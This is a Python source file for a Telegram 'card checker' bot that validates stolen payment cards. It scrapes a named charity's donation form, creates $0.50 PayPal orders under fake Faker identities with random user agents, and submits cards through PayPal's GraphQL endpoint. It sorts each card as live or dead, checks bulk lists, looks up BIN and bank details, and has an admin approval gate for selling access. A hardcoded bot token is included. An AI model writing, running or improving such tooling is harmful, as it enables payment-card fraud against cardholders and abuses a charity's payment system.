import re, json, random, time, requests, os, asyncio, sys
from fake_useragent import UserAgent
from faker import Faker
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# ============ CONFIGURATION ============
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8948469626:AAEXfCsjBH4_IhnTtIaEJ4LAbodXGq0qWx0")
ADMIN_ID = int(os.environ.get("ADMIN_ID", "1978055060"))

USERS_FILE = "users.json"
APPROVED_USERS_FILE = "approved_users.json"

fake = Faker()
processing_files = {}  # user_id -> bool for file check
BIN_CACHE = {}

BOT_OWNER = "@thispersonisbrand537"
BOT_VERSION = "3.0"

# ============ LOGGING ============
class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    RESET = '\033[0m'

def log(message, color=Colors.GREEN):
    print(f"{color}{message}{Colors.RESET}")

# ============ DATABASE ============
def load_users():
    if os.path.exists(USERS_FILE):
        with open(USERS_FILE, 'r') as f:
            return json.load(f)
    return {}

def save_users(users):
    with open(USERS_FILE, 'w') as f:
        json.dump(users, f)

def load_approved():
    if os.path.exists(APPROVED_USERS_FILE):
        with open(APPROVED_USERS_FILE, 'r') as f:
            return json.load(f)
    return []

def save_approved(approved):
    with open(APPROVED_USERS_FILE, 'w') as f:
        json.dump(approved, f)

# ============ BIN LOOKUP (cached) ============
def get_bin_info(card_number):
    bin_num = card_number[:6]
    if bin_num in BIN_CACHE:
        return BIN_CACHE[bin_num]
    try:
        url = f"https://binlist.io/lookup/{bin_num}/"
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            data = response.json()
            result = {
                'bin': bin_num,
                'brand': data.get('scheme', 'N/A').upper(),
                'type': data.get('type', 'N/A'),
                'level': data.get('level', 'N/A'),
                'bank': data.get('bank', {}).get('name', 'N/A'),
                'country': data.get('country', {}).get('name', 'N/A'),
                'country_code': data.get('country', {}).get('alpha2', 'N/A'),
                'emoji': data.get('country', {}).get('emoji', '🌍'),
                'phone': data.get('bank', {}).get('phone', 'N/A')
            }
            BIN_CACHE[bin_num] = result
            return result
    except:
        pass
    result = {
        'bin': bin_num,
        'brand': 'UNKNOWN',
        'type': 'UNKNOWN',
        'level': 'UNKNOWN',
        'bank': 'UNKNOWN',
        'country': 'UNKNOWN',
        'country_code': 'XX',
        'emoji': '🌍',
        'phone': 'N/A'
    }
    BIN_CACHE[bin_num] = result
    return result

# ============ CARD CHECK (non-blocking) ============
async def check_card_async(card_num, card_mon, card_yer, card_cvc):
    """Run the blocking check_card in a thread to avoid blocking the event loop."""
    return await asyncio.to_thread(_check_card_sync, card_num, card_mon, card_yer, card_cvc)

def _check_card_sync(card_num, card_mon, card_yer, card_cvc):
    try:
        session = requests.Session()
        session.headers.update({'User-Agent': UserAgent().random})
        
        url = "https://www.brightercommunities.org/donate-form/"
        resp = session.get(url, timeout=10)
        if resp.status_code != 200:
            return "DIE_UNKNOWN"
        
        hash_match = re.search(r'name="give-form-hash" value="([^"]+)"', resp.text)
        form_match = re.search(r'name="give-form-id" value="([^"]+)"', resp.text)
        prefix_match = re.search(r'name="give-form-id-prefix" value="([^"]+)"', resp.text)
        if not hash_match or not form_match or not prefix_match:
            return "DIE_UNKNOWN"
        
        hash_val = hash_match.group(1)
        form_id = form_match.group(1)
        prefix = prefix_match.group(1)
        
        order_url = "https://www.brightercommunities.org/wp-admin/admin-ajax.php?action=give_paypal_commerce_create_order"
        payload = {
            'give-form-id-prefix': prefix,
            'give-form-id': form_id,
            'give-form-minimum': '0.50',
            'give-form-hash': hash_val,
            'give-amount': '0.50',
            'give_first': fake.first_name(),
            'give_last': fake.last_name(),
            'give_email': fake.email()
        }
        resp2 = session.post(order_url, data=payload, timeout=10)
        if resp2.status_code != 200:
            return "DIE_UNKNOWN"
        try:
            order_id = resp2.json().get("data", {}).get("id")
        except:
            return "DIE_UNKNOWN"
        if not order_id:
            return "DIE_UNKNOWN"
        
        first_digit = card_num[0]
        card_types = {'3': 'JCB', '4': 'VISA', '5': 'MASTERCARD', '6': 'DISCOVER'}
        card_type = card_types.get(first_digit, "UNKNOWN")
        
        graphql_url = "https://www.paypal.com/graphql?fetch_credit_form_submit="
        query = """
            mutation payWithCard($token: String!, $card: CardInput) {
                approveGuestPaymentWithCreditCard(token: $token, card: $card) {
                    cart { cartId }
                    paymentContingencies { threeDomainSecure { status } }
                }
            }
        """
        variables = {
            "token": order_id,
            "card": {
                "cardNumber": card_num,
                "type": card_type,
                "expirationDate": f'{card_mon}/{card_yer}',
                "postalCode": fake.zipcode(),
                "securityCode": card_cvc
            }
        }
        headers_graphql = {'User-Agent': UserAgent().random, 'Content-Type': 'application/json'}
        resp3 = session.post(graphql_url, json={"query": query, "variables": variables}, headers=headers_graphql, timeout=15)
        response_text = resp3.text
        
        if "cartId" in response_text or "accessToken" in response_text:
            return "LIVE_CHARGED"
        elif "INVALID_SECURITY_CODE" in response_text:
            return "LIVE_CVV"
        elif "INSUFFICIENT_FUNDS" in response_text or "INVALID_BILLING_ADDRESS" in response_text:
            return "LIVE_INSUFFICIENT"
        elif "EXPIRED_CARD" in response_text:
            return "DIE_EXPIRED"
        elif "ISSUER_DECLINE" in response_text:
            return "DIE_DECLINE"
        else:
            return "DIE_UNKNOWN"
    except Exception:
        return "DIE_UNKNOWN"

# ============ FILE PROCESSING (non-blocking) ============
async def process_file_cards(update: Update, context: ContextTypes.DEFAULT_TYPE, file_path, user_id):
    global processing_files
    cards = []
    try:
        with open(file_path, 'r') as f:
            for line in f:
                line = line.strip()
                if line and '|' in line:
                    parts = line.split('|')
                    if len(parts) == 4:
                        cards.append({
                            'num': parts[0].strip(),
                            'mon': parts[1].strip(),
                            'yer': parts[2].strip()[-2:],
                            'cvc': parts[3].strip()
                        })
    except:
        await update.message.reply_text("❌ Error reading file.")
        processing_files[user_id] = False
        return
    if not cards:
        await update.message.reply_text("❌ No valid cards found.")
        processing_files[user_id] = False
        return
    
    total = len(cards)
    live_cards = []
    start_time = time.time()
    
    progress_msg = await update.message.reply_text(
        f"📁 FILE CHECK STARTED\n━━━━━━━━━━━━━━━━\n"
        f"📊 Total Cards: {total}\n"
        f"⏳ Progress: 0/{total} (0%)\n"
        f"✅ Live Found: 0\n"
        f"⏱️ Elapsed: 0s\n━━━━━━━━━━━━━━━━\n\n🔄 Starting check..."
    )
    
    for i, card in enumerate(cards, 1):
        if not processing_files.get(user_id, True):
            await progress_msg.delete()
            await update.message.reply_text("⏹️ File check cancelled.")
            return
        
        result = await check_card_async(card['num'], card['mon'], card['yer'], card['cvc'])
        elapsed = int(time.time() - start_time)
        percent = int((i / total) * 100)
        
        if result in ("LIVE_CHARGED", "LIVE_CVV", "LIVE_INSUFFICIENT"):
            live_cards.append({'card': card, 'result': result})
            if result == "LIVE_CHARGED":
                status = "🔥 CHARGED"
            elif result == "LIVE_CVV":
                status = "⚡️ CVV"
            else:
                status = "💰 INSUFFICIENT"
            bin_info = get_bin_info(card['num'])
            await update.message.reply_text(
                f"✅ LIVE CARD #{len(live_cards)}\n"
                f"💳 `{card['num']}|{card['mon']}|{card['yer']}|{card['cvc']}`\n"
                f"{status} | {bin_info['brand']} - {bin_info['country']}\n"
                f"🏦 Bank: {bin_info['bank']}\n"
                f"🌍 Country: {bin_info['emoji']} {bin_info['country']}",
                parse_mode='Markdown'
            )
        
        avg_time = elapsed / i if i > 0 else 0
        eta = int((total - i) * avg_time) if avg_time > 0 else 0
        try:
            await progress_msg.edit_text(
                f"📁 FILE CHECK IN PROGRESS\n━━━━━━━━━━━━━━━━\n"
                f"📊 Total Cards: {total}\n"
                f"⏳ Progress: {i}/{total} ({percent}%)\n"
                f"✅ Live Found: {len(live_cards)}\n"
                f"⏱️ Elapsed: {elapsed}s\n"
                f"🕐 ETA: {eta}s\n━━━━━━━━━━━━━━━━\n\n"
                f"🔄 Checking: `{card['num'][:4]}****{card['num'][-4:]}`\n"
                f"⚡ Speed: {avg_time:.1f}s/card"
            )
        except:
            pass
        
        await asyncio.sleep(1)
    
    await progress_msg.delete()
    total_time = int(time.time() - start_time)
    
    if live_cards:
        live_list = "✅ LIVE CARDS FOUND\n━━━━━━━━━━━━━━━━\n"
        for idx, lc in enumerate(live_cards, 1):
            icon = "🔥" if lc['result'] == "LIVE_CHARGED" else "⚡️" if lc['result'] == "LIVE_CVV" else "💰"
            live_list += f"{idx}. {icon} `{lc['card']['num']}|{lc['card']['mon']}|{lc['card']['yer']}|{lc['card']['cvc']}`\n"
    else:
        live_list = "❌ No live cards found!"
    
    final_report = f"""📁 FILE CHECK COMPLETE
━━━━━━━━━━━━━━━━
📊 Total: {total}
✅ Live: {len(live_cards)}
💀 Dead: {total - len(live_cards)}
📈 Rate: {(len(live_cards)/total*100):.1f}%
⏱️ Time: {total_time}s

{live_list}
━━━━━━━━━━━━━━━━
👑 Bot by {BOT_OWNER}"""
    await update.message.reply_text(final_report, parse_mode='Markdown')
    processing_files[user_id] = False

# ============ TELEGRAM HANDLERS ============

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_name = update.effective_user.first_name
    
    users = load_users()
    if str(user_id) not in users:
        users[str(user_id)] = {
            'name': user_name,
            'username': update.effective_user.username,
            'date': time.strftime('%Y-%m-%d %H:%M:%S')
        }
        save_users(users)
        admin_text = f"🆕 NEW USER!\n👤 {user_name}\n🆔 <code>{user_id}</code>\n📛 @{update.effective_user.username}\n\n<code>/approve {user_id}</code>"
        keyboard = [[InlineKeyboardButton("📋 COPY", callback_data=f"copy_{user_id}")]]
        await context.bot.send_message(chat_id=ADMIN_ID, text=admin_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='HTML')
    
    approved = user_id in load_approved()
    welcome_text = f"""🔥 CARD CHECKER BOT v{BOT_VERSION}

Welcome {user_name}!

━━━━━━━━━━━━━━━━
📌 STATUS: {'✅ APPROVED' if approved else '⏳ PENDING'}
━━━━━━━━━━━━━━━━

⚡️ FEATURES:
• Single Card Check (with full BIN details)
• Bulk File Check with Live Progress
• BIN Lookup (Country/Bank/Brand)
• Copy Card Details
• True Multi-User Support (non-blocking)

💡 HOW TO USE:

1️⃣ SINGLE CHECK:
Send: `number|month|year|cvv`
Example: `4000000000000000|12|2026|123`

2️⃣ FILE CHECK:
Send a .txt file with one card per line

3️⃣ BIN LOOKUP:
Send first 6 digits of the card

━━━━━━━━━━━━━━━━
👑 Bot by {BOT_OWNER}"""
    
    keyboard = []
    if approved:
        keyboard = [
            [InlineKeyboardButton("🔍 SINGLE", callback_data='single_check')],
            [InlineKeyboardButton("📁 FILE", callback_data='file_check')],
            [InlineKeyboardButton("🔍 BIN", callback_data='bin_lookup')]
        ]
    else:
        keyboard = [[InlineKeyboardButton("⏳ PENDING", callback_data='waiting')]]
    
    await update.message.reply_text(welcome_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

# Admin commands
async def approve_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Unauthorized!")
        return
    try:
        user_id = int(context.args[0])
        approved = load_approved()
        if user_id not in approved:
            approved.append(user_id)
            save_approved(approved)
            await update.message.reply_text(f"✅ User {user_id} approved!")
            try:
                await context.bot.send_message(user_id, f"✅ APPROVED!\nSend /start\n\n👑 Bot by {BOT_OWNER}")
            except:
                pass
        else:
            await update.message.reply_text("⚠️ Already approved!")
    except:
        await update.message.reply_text("❌ Usage: /approve <user_id>")

async def remove_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Unauthorized!")
        return
    try:
        user_id = int(context.args[0])
        approved = load_approved()
        if user_id in approved:
            approved.remove(user_id)
            save_approved(approved)
            await update.message.reply_text(f"✅ User {user_id} removed!")
            try:
                await context.bot.send_message(user_id, "⚠️ Access revoked!")
            except:
                pass
        else:
            await update.message.reply_text("⚠️ User not found!")
    except:
        await update.message.reply_text("❌ Usage: /remove <user_id>")

async def users_list(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Unauthorized!")
        return
    users = load_users()
    approved = load_approved()
    text = "📊 USERS LIST\n━━━━━━━━━━━━━━━━\n\n"
    for uid, info in users.items():
        uid_int = int(uid)
        status = "✅" if uid_int in approved else "⏳"
        text += f"{status} {info['name']}\n🆔 `{uid}`\n━━━━━━━━━━━━━━━━\n"
    await update.message.reply_text(text, parse_mode='Markdown')

# Button handlers
async def single_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if update.effective_user.id not in load_approved():
        await query.message.reply_text("❌ Not approved!")
        return
    await query.message.reply_text(
        "🔍 SEND CARD\n━━━━━━━━━━━━━━━━\n\n"
        "Format: `number|month|year|cvv`\n"
        "Example: `4000000000000000|12|2026|123`",
        parse_mode='Markdown'
    )
    context.user_data['awaiting_card'] = True

async def file_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if update.effective_user.id not in load_approved():
        await query.message.reply_text("❌ Not approved!")
        return
    await query.message.reply_text(
        "📁 SEND .txt FILE\n━━━━━━━━━━━━━━━━\n\n"
        "One card per line:\n"
        "`card|month|year|cvv`\n\n"
        "Example:\n"
        "`4000000000000000|12|2026|123`\n"
        "`4111111111111111|01|2027|456`",
        parse_mode='Markdown'
    )
    context.user_data['awaiting_file'] = True

async def bin_lookup(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if update.effective_user.id not in load_approved():
        await query.message.reply_text("❌ Not approved!")
        return
    await query.message.reply_text(
        "🔍 BIN LOOKUP\n━━━━━━━━━━━━━━━━\n\n"
        "Send first 6 digits of the card.\n"
        "Example: `400000`\n\n"
        "I will show:\n"
        "• Brand (Visa/Mastercard)\n"
        "• Type (Credit/Debit)\n"
        "• Bank Name\n"
        "• Country",
        parse_mode='Markdown'
    )
    context.user_data['awaiting_bin'] = True

async def waiting(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.message.reply_text(f"⏳ Pending approval. Wait for admin.\n\n👑 Bot by {BOT_OWNER}")

# Message handlers
async def handle_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('awaiting_card'):
        return
    user_id = update.effective_user.id
    if user_id not in load_approved():
        await update.message.reply_text("❌ Not approved!")
        context.user_data['awaiting_card'] = False
        return
    
    parts = update.message.text.strip().split('|')
    if len(parts) != 4:
        await update.message.reply_text("❌ Invalid format. Use: `number|month|year|cvv`", parse_mode='Markdown')
        return
    
    card_num, card_mon, card_yer, card_cvc = parts
    if len(card_yer) == 4:
        card_yer = card_yer[2:]
    
    bin_info = get_bin_info(card_num)
    status_msg = await update.message.reply_text("⏳ CHECKING...")
    start = time.time()
    result = await check_card_async(card_num, card_mon, card_yer, card_cvc)
    elapsed = int(time.time() - start)
    await status_msg.delete()
    
    if result == "LIVE_CHARGED":
        status = "✅ LIVE CHARGED"
        emoji = "🔥"
        extra = "• $0.50 charged successfully"
    elif result == "LIVE_CVV":
        status = "⚡️ CVV LIVE"
        emoji = "💳"
        extra = "• CVV is correct, card valid"
    elif result == "LIVE_INSUFFICIENT":
        status = "💰 INSUFFICIENT FUNDS"
        emoji = "💵"
        extra = "• Card valid but insufficient balance"
    else:
        status = "❌ DIE"
        emoji = "💀"
        extra = "• Card invalid / expired / declined"
    
    text = f"""{emoji} {status}
━━━━━━━━━━━━━━━━
💳 `{card_num}|{card_mon}|{card_yer}|{card_cvc}`

🏦 BIN INFORMATION:
• BIN: `{bin_info['bin']}`
• Brand: {bin_info['brand']}
• Type: {bin_info['type']}
• Level: {bin_info['level']}
• Bank: {bin_info['bank']}
• Country: {bin_info['emoji']} {bin_info['country']}
• Bank Phone: {bin_info['phone']}

📊 RESULT: {extra}
⏱️ Time: {elapsed}s
━━━━━━━━━━━━━━━━
👑 Bot by {BOT_OWNER}"""
    keyboard = [[InlineKeyboardButton("📋 COPY", callback_data=f"copy_{card_num}|{card_mon}|{card_yer}|{card_cvc}")]]
    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
    context.user_data['awaiting_card'] = False

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('awaiting_file'):
        return
    user_id = update.effective_user.id
    if user_id not in load_approved():
        await update.message.reply_text("❌ Not approved!")
        context.user_data['awaiting_file'] = False
        return
    
    if processing_files.get(user_id, False):
        await update.message.reply_text("⚠️ A file check is already running. Please wait.")
        return
    
    doc = update.message.document
    if not doc.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Please send a .txt file.")
        return
    
    msg = await update.message.reply_text("📥 Downloading file...")
    file = await context.bot.get_file(doc.file_id)
    path = f"temp_{user_id}.txt"
    await file.download_to_drive(path)
    await msg.delete()
    
    processing_files[user_id] = True
    await process_file_cards(update, context, path, user_id)
    if os.path.exists(path):
        os.remove(path)
    context.user_data['awaiting_file'] = False

async def handle_bin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('awaiting_bin'):
        return
    user_id = update.effective_user.id
    if user_id not in load_approved():
        await update.message.reply_text("❌ Not approved!")
        context.user_data['awaiting_bin'] = False
        return
    
    bin_num = update.message.text.strip()[:6]
    if not bin_num.isdigit() or len(bin_num) < 6:
        await update.message.reply_text("❌ Invalid BIN. Send first 6 digits only.\nExample: `400000`", parse_mode='Markdown')
        return
    
    fetching = await update.message.reply_text("🔍 Fetching BIN information...")
    bin_info = get_bin_info(bin_num)
    await fetching.delete()
    
    text = f"""🔍 BIN LOOKUP RESULT
━━━━━━━━━━━━━━━━
📊 BIN: {bin_info['bin']}
💳 Brand: {bin_info['brand']}
📝 Type: {bin_info['type']}
⭐ Level: {bin_info['level']}
🏦 Bank: {bin_info['bank']}
🌍 Country: {bin_info['emoji']} {bin_info['country']}
📞 Bank Phone: {bin_info['phone']}
━━━━━━━━━━━━━━━━
👑 Bot by {BOT_OWNER}"""
    
    keyboard = [[InlineKeyboardButton("🔄 CHECK ANOTHER", callback_data='bin_lookup')]]
    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
    context.user_data['awaiting_bin'] = False

async def copy_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if query.data.startswith("copy_"):
        card = query.data.replace("copy_", "")
        await query.answer(f"✅ Copied: {card}", show_alert=True)

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    log(f"Error: {context.error}", Colors.RED)
    try:
        if update and update.effective_message:
            await update.effective_message.reply_text(
                "⚠️ An unexpected error occurred. Please try again.\n\n"
                f"👑 Bot by {BOT_OWNER}"
            )
    except:
        pass

# ============ MAIN ============
def main():
    log("\n" + "="*50, Colors.YELLOW)
    log(f"🤖 CARD CHECKER BOT v{BOT_VERSION}", Colors.GREEN)
    log(f"👑 Owner: {BOT_OWNER}", Colors.GREEN)
    log("="*50, Colors.YELLOW)
    
    app = Application.builder().token(BOT_TOKEN).build()
    
    # Commands
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("approve", approve_user))
    app.add_handler(CommandHandler("remove", remove_user))
    app.add_handler(CommandHandler("users", users_list))
    
    # Callbacks
    app.add_handler(CallbackQueryHandler(single_check, pattern='single_check'))
    app.add_handler(CallbackQueryHandler(file_check, pattern='file_check'))
    app.add_handler(CallbackQueryHandler(bin_lookup, pattern='bin_lookup'))
    app.add_handler(CallbackQueryHandler(waiting, pattern='waiting'))
    app.add_handler(CallbackQueryHandler(copy_card, pattern='^copy_'))
    
    # Message handlers
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_card))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_bin))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    
    app.add_error_handler(error_handler)
    
    log(f"✅ Bot started successfully!", Colors.GREEN)
    log(f"✅ Admin ID: {ADMIN_ID}", Colors.GREEN)
    log("="*50, Colors.YELLOW)
    log("📱 Bot is polling... Press Ctrl+C to stop", Colors.BLUE)
    log("="*50 + "\n", Colors.YELLOW)
    
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        log("\n⚠️ Bot stopped by user.", Colors.RED)
        sys.exit(0)
    except Exception as e:
        log(f"\n❌ Fatal error: {e}", Colors.RED)
        sys.exit(1)
